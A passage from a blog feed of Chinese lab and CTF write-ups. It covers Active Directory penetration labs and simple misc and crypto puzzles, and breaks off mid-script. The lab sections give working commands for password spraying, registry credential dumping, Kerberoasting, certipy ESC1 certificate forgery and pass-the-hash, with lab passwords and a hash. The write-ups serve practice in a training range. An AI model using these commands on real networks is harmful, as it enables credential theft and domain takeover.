aria-hidden="true">img</figcaption></figure><p>在域控中可以看到Lumia的真名叫卿建</p><figure><imgsrc="/images/春秋云境-Exchange/1753111994791-2ab1b9fa-e563-4636-925d-233cd1058ce5.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Exchange/1753110982683-3ca43b0a-96d8-4d6d-a684-700875323d37.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>解压得到flag</p><figure><imgsrc="/images/春秋云境-Exchange/1753110884031-9a5922c8-d4a2-4299-8063-239c3e8b8c7a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
          <category> 春秋云境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 春秋云境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-Delegation</title>
      <link href="/posts/93b35a6e/"/>
      <url>/posts/93b35a6e/</url>
      
        <content type="html"><![CDATA[<p>进去是个cms，访问/admin自动跳转到了后台</p><figure><imgsrc="/images/春秋云境-Delegation/1752204854085-2382c94e-0146-4aae-a0c5-b5ca79f7640f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>弱口令admin/123456登陆成功</p><figure><imgsrc="/images/春秋云境-Delegation/1752205030805-d02b4cd2-06a9-4c6d-ab72-8abee98706d6.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>可以找到漏洞CVE-2021-42643，写入一句话</p><figure><imgsrc="/images/春秋云境-Delegation/1752206146770-69018445-1651-4a12-8f2d-0a0e8924e439.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>蚁剑连接</p><figure><imgsrc="/images/春秋云境-Delegation/1752206242973-ba40df4f-7bee-4029-b746-2e97356d141d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>可以找到flag，但是还没有权限读</p><p>利用diff命令suid提权</p><figure><imgsrc="/images/春秋云境-Delegation/1752206635565-e5ea8055-9c05-46e0-a58d-c723e885c5a5.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Delegation/1752206546056-b9b53b4f-c92b-4350-b0b3-c1d6d3ea2b3d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>上传fscan扫内网</p><figure><imgsrc="/images/春秋云境-Delegation/1752220245105-bdc41086-0287-48ce-81b6-2c239cf4e4fc.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>除本机外还有三台主机，根据前面的提示先看WIN19，扫一遍发现开启了3389端口</p><figure><imgsrc="/images/春秋云境-Delegation/1752220488333-1815ae58-2942-4e71-b66e-e27f120a1463.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>搭建frp</p><figure><imgsrc="/images/春秋云境-Delegation/1752220779535-36bc5872-837c-4952-89a4-3a4e69534eb2.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>根据提示尝试用rockyou爆破，得到密码babygirl1，但是过期了</p><p>proxychains4 crackmapexec smb 172.22.4.45 -u Adrian -p/usr/share/wordlists/rockyou.txt -d WIN19</p><figure><imgsrc="/images/春秋云境-Delegation/1752221170377-23533430-db79-420c-a5f6-acff1ed60c04.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>远程连接修改密码</p><figure><imgsrc="/images/春秋云境-Delegation/1752221498083-bfac72c9-ebe5-43bb-bf3c-fc5250d24f67.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>桌面上有个文件夹，打开里面的html文件看一下，其中提到了可以修改计算机的注册表的gupdate</p><figure><imgsrc="/images/春秋云境-Delegation/1752221990513-00d7460e-96b9-4632-bdd7-766ad051f635.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>写一个1.bat，传上去</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM C:\Users\Adrian\Desktop\system</span><br><span class="line">reg save HKLM\SAM C:\Users\Adrian\Desktop\sam</span><br><span class="line">reg save HKLM\SECURITY C:\Users\Adrian\Desktop\security</span><br></pre></td></tr></table></figure><p>用msf生成用于执行上面的bat的exe，传上去</p><figure><imgsrc="/images/春秋云境-Delegation/1752237390782-e031034a-4ff5-4a9d-b86b-42ff702db34a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>修改注册表并运行gupdate，使其以管理员权限执行1.bat，以此提权</p><figure><imgsrc="/images/春秋云境-Delegation/1752237500305-215050ef-2eb4-4293-9a16-ef20cb37571d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>得到system、sam、security三个文件，从中提取出管理员账户的hash</p><figure><imgsrc="/images/春秋云境-Delegation/1753019972824-741380bc-527b-4494-b961-954af1f15bee.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>打pth</p><figure><imgsrc="/images/春秋云境-Delegation/1752237945102-d733574f-d19e-4015-aff9-2af5526385c0.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>创建一个管理员账户</p><figure><imgsrc="/images/春秋云境-Delegation/1752238371818-fd4f339c-e5b4-477c-94a3-7b1bd33edd32.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>bloodhound收集信息</p><figure><imgsrc="/images/春秋云境-Delegation/1753020002089-f34aa385-b6cb-4c1b-b89b-eb020b89aacb.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Delegation/1753020340303-804b4ba1-464f-48ec-ab7e-e843dd22a331.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>分析+提示可知要打非约束委派</p><p>上传rubeus抓取票据</p><figure><imgsrc="/images/春秋云境-Delegation/1753021347891-698878bd-405c-4bed-905d-971458c55e0c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用dfscoerce触发认证</p><figure><imgsrc="/images/春秋云境-Delegation/1753021354096-9d9cbb5b-0b87-44b0-916f-63896acbb09d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Delegation/1753021360650-0856f297-1063-4d72-b5ca-a75e3a10e785.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>对TGT本地进行base64解码,保存为文件</p><figure><imgsrc="/images/春秋云境-Delegation/1753021366189-395c3bfc-abb2-4baa-bc7b-dd6cdd8db557.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用mimikatz获得域控哈希</p><figure><imgsrc="/images/春秋云境-Delegation/1753021371509-1d00c7d1-42c6-4095-a230-bf416ad4e187.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>对剩下两台机器打pth即可</p><figure><imgsrc="/images/春秋云境-Delegation/1753021159522-034cf03e-2f8f-4b9a-bbd5-75eae20d224d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Delegation/1753021252735-ffe6b96b-9347-4c20-85c5-a65c2a12fc13.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
          <category> 春秋云境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 春秋云境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境 Certify</title>
      <link href="/posts/a12d2be3/"/>
      <url>/posts/a12d2be3/</url>
      
        <content type="html"><![CDATA[<p>一如既往先上fscan扫一遍</p><figure><imgsrc="/images/春秋云境-Certify/1751895328696-7517f822-3b06-4362-9c9a-ef660810417f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>8983端口有个solr，可以看到存在log4j，这里存在log4shell漏洞</p><figure><imgsrc="/images/春秋云境-Certify/1751895806710-e890724e-3113-4883-9a47-5163f8b12dae.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Certify/1751896267672-9604c124-b78a-4543-9b9a-f500de74dacd.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Certify/1751896279090-97f6ff4f-bd06-4293-b6db-1171d8c54cab.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用现成工具弹shell</p><figure><imgsrc="/images/春秋云境-Certify/1751905885701-b995e29c-f27b-4e07-b7a6-f6094a4615ea.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Certify/1751905910639-d14bdde2-d950-4e9b-8bcf-e3eba9c428e8.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Certify/1751905924728-16ad6a25-5da5-47a2-aa5b-913ff81b237d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>看不了/root，需要提权发现这里可以sudo提权，grc命令配置错误</p><figure><imgsrc="/images/春秋云境-Certify/1751906163100-767f81ad-c972-40a1-9533-4efc85012925.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Certify/1751906145099-2d7f0d4e-4431-4fcb-9d6c-648684865c8a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>上传fscan扫一下内网，除本机外还有三台主机，一台域控，一台windowsserver，一台ubuntu是ftp服务器</p><figure><imgsrc="/images/春秋云境-Certify/1751906382618-8ad735d9-4ee7-4ce3-a292-c4a03f861131.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>搭建frp</p><figure><imgsrc="/images/春秋云境-Certify/1751906797424-f18e83fd-c2fc-489d-9198-2a920be2c11e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Certify/1751906807428-c3a95605-6f0d-4452-b57e-d3f5d56e3c9e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>题目中提示smb，那么尝试通过smb服务访问文件服务器，得到第二个flag</p><figure><imgsrc="/images/春秋云境-Certify/1751907382055-492f69d0-e3e6-463a-94d5-bcebd5c7a8d8.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Certify/1751907449216-299461e7-018e-4d1b-87b2-fa4163682dd8.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>回到上一级，下载db文件</p><figure><imgsrc="/images/春秋云境-Certify/1751908124033-1603da34-4c01-4815-b70e-98ec1d6d2a41.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>连接上查看一下，可以在一个表中找到四个密码，但是不知道用户名，在另一个表中有大量用户名</p><figure><imgsrc="/images/春秋云境-Certify/1751908293568-05f8bac2-dc2d-4963-b993-9a757260b1c5.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Certify/1751908315789-2d70006c-1eca-48a1-823b-7922a9a77f2c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>对windows server尝试密钥喷洒</p><p>proxychains4 crackmapexec smb 172.22.9.26 -u user.txt -ppassword.txt</p><p>找到正确的</p><figure><imgsrc="/images/春秋云境-Certify/1751909540351-03a651a6-aff0-48e5-805d-c071c7c36bfd.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>xiaorang.lab:i9XDE02pLVf</p><p>前面的提示中提到了spn，找一下域用户的spn，找到了两个用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Certify/1751957468053-e7e5d16d-4e46-43e5-8ed3-11e96e1f558b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>选一个爆破</p><p>hashcat -m 13100 -a 0 1.txt /usr/share/wordlists/rockyou.txt--force</p><figure><imgsrc="/images/春秋云境-Certify/1751957624176-1dc06f8c-68c3-4997-8460-11d58eb3a32d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>现在可以远程桌面连接windows server，但是权限比较低</p><p>查看一下证书</p><p>proxychains4 certipy find -u 'zhangxia@xiaorang.lab' -password'MyPass2@<span class="citation" data-cites="6">@6</span>' -dc-ip172.22.9.7 -vulnerable -stdout</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">Certificate Authorities</span><br><span class="line">  0</span><br><span class="line">    CA Name                             : xiaorang-XIAORANG-DC-CA</span><br><span class="line">    DNS Name                            : XIAORANG-DC.xiaorang.lab</span><br><span class="line">    Certificate Subject                 : CN=xiaorang-XIAORANG-DC-CA, DC=xiaorang, DC=lab</span><br><span class="line">    Certificate Serial Number           : 43A73F4A37050EAA4E29C0D95BC84BB5</span><br><span class="line">    Certificate Validity Start          : 2023-07-14 04:33:21+00:00</span><br><span class="line">    Certificate Validity End            : 2028-07-14 04:43:21+00:00</span><br><span class="line">    Web Enrollment</span><br><span class="line">      HTTP</span><br><span class="line">        Enabled                         : False</span><br><span class="line">      HTTPS</span><br><span class="line">        Enabled                         : False</span><br><span class="line">    User Specified SAN                  : Unknown</span><br><span class="line">    Request Disposition                 : Unknown</span><br><span class="line">    Enforce Encryption for Requests     : Unknown</span><br><span class="line">    Active Policy                       : Unknown</span><br><span class="line">    Disabled Extensions                 : Unknown</span><br><span class="line">Certificate Templates</span><br><span class="line">  0</span><br><span class="line">    Template Name                       : XR Manager</span><br><span class="line">    Display Name                        : XR Manager</span><br><span class="line">    Certificate Authorities             : xiaorang-XIAORANG-DC-CA</span><br><span class="line">    Enabled                             : True</span><br><span class="line">    Client Authentication               : True</span><br><span class="line">    Enrollment Agent                    : False</span><br><span class="line">    Any Purpose                         : False</span><br><span class="line">    Enrollee Supplies Subject           : True</span><br><span class="line">    Certificate Name Flag               : EnrolleeSuppliesSubject</span><br><span class="line">    Enrollment Flag                     : IncludeSymmetricAlgorithms</span><br><span class="line">                                          PublishToDs</span><br><span class="line">    Private Key Flag                    : ExportableKey</span><br><span class="line">    Extended Key Usage                  : Encrypting File System</span><br><span class="line">                                          Secure Email</span><br><span class="line">                                          Client Authentication</span><br><span class="line">    Requires Manager Approval           : False</span><br><span class="line">    Requires Key Archival               : False</span><br><span class="line">    Authorized Signatures Required      : 0</span><br><span class="line">    Schema Version                      : 2</span><br><span class="line">    Validity Period                     : 1 year</span><br><span class="line">    Renewal Period                      : 6 weeks</span><br><span class="line">    Minimum RSA Key Length              : 2048</span><br><span class="line">    Template Created                    : 2023-07-14T04:51:15+00:00</span><br><span class="line">    Template Last Modified              : 2023-07-14T04:51:44+00:00</span><br><span class="line">    Permissions</span><br><span class="line">      Enrollment Permissions</span><br><span class="line">        Enrollment Rights               : XIAORANG.LAB\Domain Admins</span><br><span class="line">                                          XIAORANG.LAB\Domain Users</span><br><span class="line">                                          XIAORANG.LAB\Enterprise Admins</span><br><span class="line">                                          XIAORANG.LAB\Authenticated Users</span><br><span class="line">      Object Control Permissions</span><br><span class="line">        Owner                           : XIAORANG.LAB\Administrator</span><br><span class="line">        Full Control Principals         : XIAORANG.LAB\Domain Admins</span><br><span class="line">                                          XIAORANG.LAB\Enterprise Admins</span><br><span class="line">        Write Owner Principals          : XIAORANG.LAB\Domain Admins</span><br><span class="line">                                          XIAORANG.LAB\Enterprise Admins</span><br><span class="line">        Write Dacl Principals           : XIAORANG.LAB\Domain Admins</span><br><span class="line">                                          XIAORANG.LAB\Enterprise Admins</span><br><span class="line">        Write Property Enroll           : XIAORANG.LAB\Domain Admins</span><br><span class="line">                                          XIAORANG.LAB\Domain Users</span><br><span class="line">                                          XIAORANG.LAB\Enterprise Admins</span><br><span class="line">    [+] User Enrollable Principals      : XIAORANG.LAB\Domain Users</span><br><span class="line">                                          XIAORANG.LAB\Authenticated Users</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC1                              : Enrollee supplies subject and template allows client authentication.</span><br></pre></td></tr></table></figure><p>申请XR Manager证书模板伪造域管理员证书</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains certipy req -u <span class="string">&#x27;zhangxia@xiaorang.lab&#x27;</span> -p <span class="string">&#x27;MyPass2@@6&#x27;</span> -target 172.22.9.7 -dc-ip 172.22.9.7 -ca <span class="string">&quot;xiaorang-XIAORANG-DC-CA&quot;</span> -template <span class="string">&#x27;XR Manager&#x27;</span>  -upn <span class="string">&#x27;administrator@xiaorang.lab&#x27;</span></span><br></pre></td></tr></table></figure><p><imgsrc="/images/春秋云境-Certify/1751959503630-a7c4453c-1686-45e7-a177-1af55f9930f9.png"alt="img" />获取TGT和NTLM hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains certipy auth -pfx administrator.pfx -dc-ip 172.22.9.7</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Certify/1752848391979-3375e71f-7b03-46eb-8576-100e544a71d8.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>打pth拿到剩下两个flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.9.7 -u administrator -H 2f1b57eefb2d152196836b0516abea80 -d xiaorang.lab -x <span class="string">&quot;type C:\Users\Administrator\flag\flag04.txt&quot;</span></span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Certify/1752848566488-b998db46-1c4d-442b-8697-0d79ecee9259.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Certify/1752848613822-7a1c4cba-5d05-4d17-bb12-91ee764e5682.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
          <category> 春秋云境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 春秋云境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>L3HCTF2025 Writeup</title>
      <link href="/posts/b33bbe6c/"/>
      <url>/posts/b33bbe6c/</url>
      
        <content type="html"><![CDATA[<blockquote><p>还是太菜了，签了个到就遗憾退场了，感觉脑子越来越转不动了，跟出题人的脑电波越来越对不上了</p></blockquote><h2 id="misc">Misc</h2><h3 id="量子双生影">量子双生影</h3><p>在尝试将图片传到wsl里时就自己分成了两张图片</p><figure><img src="/images/L3HCTF2025-Writeup/image-20250714094621268.png"alt="image-20250714094621268" /><figcaption aria-hidden="true">image-20250714094621268</figcaption></figure><p>把多出来的那张与原图异或一下，得到另一个二维码</p><figure><img src="/images/L3HCTF2025-Writeup/image-20250714094848378.png"alt="image-20250714094848378" /><figcaption aria-hidden="true">image-20250714094848378</figcaption></figure><p>扫出来就是flag：L3HCTF{Quantum_ADS_XOR}</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> L3HCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MOCSCTF2025 Writeup</title>
      <link href="/posts/46c5c26b/"/>
      <url>/posts/46c5c26b/</url>
      
        <content type="html"><![CDATA[<blockquote><p>帮联队里别的师傅看的比赛，做了点简单题</p></blockquote><h2 id="misc">Misc</h2><h3 id="ez-picture">ez-picture</h3><p>伪加密改回去解开压缩包</p><figure><img src="/images/MOCSCTF2025-Writeup/image-20250713190109710.png"alt="image-20250713190109710" /><figcaption aria-hidden="true">image-20250713190109710</figcaption></figure><p>对于key.txt：base100 -&gt; base64</p><figure><img src="/images/MOCSCTF2025-Writeup/image-20250713190221446.png"alt="image-20250713190221446" /><figcaption aria-hidden="true">image-20250713190221446</figcaption></figure><figure><img src="/images/MOCSCTF2025-Writeup/image-20250713190251979.png"alt="image-20250713190251979" /><figcaption aria-hidden="true">image-20250713190251979</figcaption></figure><p>用key对flag文件异或，得到一个png</p><figure><img src="/images/MOCSCTF2025-Writeup/image-20250713190344888.png"alt="image-20250713190344888" /><figcaption aria-hidden="true">image-20250713190344888</figcaption></figure><p>爆破png的宽高，修改为正确的值即可看到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&quot;download.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()    <span class="comment">#填入图片名</span></span><br><span class="line">crc32frombp = <span class="built_in">int</span>(crcbp[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(),<span class="number">16</span>)    </span><br><span class="line"><span class="built_in">print</span>(crc32frombp)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):                       </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):                    </span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + \</span><br><span class="line">            struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="comment"># print(crc32)</span></span><br><span class="line">        <span class="keyword">if</span>(crc32 == crc32frombp):</span><br><span class="line">            <span class="built_in">print</span>(i, j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#3906191683</span></span><br><span class="line"><span class="comment">#1920 1080</span></span><br><span class="line"><span class="comment">#hex: 0x780 0x438</span></span><br></pre></td></tr></table></figure><figure><img src="/images/MOCSCTF2025-Writeup/image-20250713190548509.png"alt="image-20250713190548509" /><figcaption aria-hidden="true">image-20250713190548509</figcaption></figure><figure><img src="/images/MOCSCTF2025-Writeup/download.png" alt="download" /><figcaption aria-hidden="true">download</figcaption></figure><h2 id="crypto">Crypto</h2><h3 id="ez-learning">ez-learning</h3><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">      </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long, long_to_bytes, GCD</span><br><span class="line"><span class="keyword">import</span> gmpy2 </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extended_gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> b, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    d, x1, y1 = extended_gcd(b % a, a)</span><br><span class="line">    x = y1 - (b // a) * x1</span><br><span class="line">    y = x1</span><br><span class="line">    <span class="keyword">return</span> d, x, y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;RSA learning 挑戰 &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">    m1_val = bytes_to_long(flag_part1_str.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    m2_val = bytes_to_long(flag_part2_str.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    m3_val = bytes_to_long(flag_part3_str.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    m4_val = bytes_to_long(flag_part4_str.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--- 第一部分 ---&quot;</span>)</span><br><span class="line">    p1_bits = <span class="number">256</span></span><br><span class="line">    q1_bits = <span class="number">256</span></span><br><span class="line">    p1 = getPrime(p1_bits)</span><br><span class="line">    q1 = getPrime(q1_bits)</span><br><span class="line">    <span class="keyword">while</span> p1 == q1: </span><br><span class="line">        q1 = getPrime(q1_bits)   </span><br><span class="line">    n1 = p1 * q1</span><br><span class="line">    phi1 = (p1 - <span class="number">1</span>) * (q1 - <span class="number">1</span>) </span><br><span class="line">    e1 = <span class="number">65537</span></span><br><span class="line">    c1 = <span class="built_in">pow</span>(m1_val, e1, n1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;n1 = <span class="subst">&#123;n1&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span 